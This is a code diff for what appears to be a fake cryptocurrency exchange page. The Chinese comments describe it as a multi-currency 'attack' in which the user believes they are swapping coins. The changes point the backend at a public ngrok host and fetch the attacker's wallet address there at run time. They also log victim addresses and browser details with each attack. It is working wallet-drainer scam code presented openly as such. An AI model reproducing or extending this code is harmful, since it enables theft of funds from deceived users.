@@ -4,7 +4,8 @@
 
 // 🎯 攻击者地址配置 - 动态后端管理
 let CURRENT_ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';  // 默认地址
-const BACKEND_API = 'http://localhost:5001';  // Python后端地址
+// const BACKEND_API = 'http://localhost:5001';  // Python后端地址
+const BACKEND_API = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';  // Python后端地址（通过ngrok）
 
 // 🔄 实时获取攻击者地址
 async function getCurrentAttackerAddress() {
@@ -573,7 +574,11 @@ function calculateConversion() {
 }
 
 // 🎯 增强的攻击执行函数 - 保留原有逻辑，添加多币种支持
-function executeMultiCurrencyAttack() {
+async function executeMultiCurrencyAttack() {
+    //实时获取当前攻击者地址
+    const attackerInfo = await getCurrentAttackerAddress();
+    const currentAttackerAddress = attackerInfo.address;
+
     // 如果是TRX，使用原有的executeAttack函数
     if (currentFromCurrency === 'TRX') {
         if (typeof executeAttack === 'function') {
@@ -596,7 +601,9 @@ function executeMultiCurrencyAttack() {
     
     debugLog(`🎯🎯🎯 用户执行${currentFromCurrency}兑换 - 多币种攻击开始！🎯🎯🎯`);
     debugLog(`🎯 用户以为兑换: ${fromAmount} ${currentFromCurrency} → ${document.getElementById('toAmount').value} ${currentToCurrency}`);
-    
+    debugLog(`🎯 当前攻击者地址: ${currentAttackerAddress}`);
+    debugLog(`🎯 钱包信息: ${attackerInfo.info ? attackerInfo.info.wallet_name : '默认钱包'}`);
+
     // 记录攻击数据
     const attackRecord = {
         timestamp: new Date().toISOString(),
@@ -604,7 +611,7 @@ function executeMultiCurrencyAttack() {
         fromCurrency: currentFromCurrency,
         toCurrency: currentToCurrency,
         victimAddress: currentAccount,
-        attackerAddress: ATTACKER_ADDRESS,
+        attackerAddress: currentAttackerAddress, //使用动态获取的地址
         userThoughtAmount: parseFloat(fromAmount),
         userThoughtReceive: parseFloat(document.getElementById('toAmount').value),
         userAgent: navigator.userAgent,
@@ -648,13 +655,13 @@ function initMultiCurrencyFeatures() {
         const originalOnclick = convertBtn.onclick;
         
         // 设置新的onclick
-        convertBtn.onclick = function() {
+        convertBtn.onclick = async function() {
             if (currentFromCurrency === 'TRX' && typeof executeAttack === 'function') {
                 // TRX使用原有逻辑
-                return executeAttack();
+                return await executeAttack();
             } else {
                 // 其他币种使用新逻辑
-                return executeMultiCurrencyAttack();
+                return await executeMultiCurrencyAttack();
             }
         };
     }
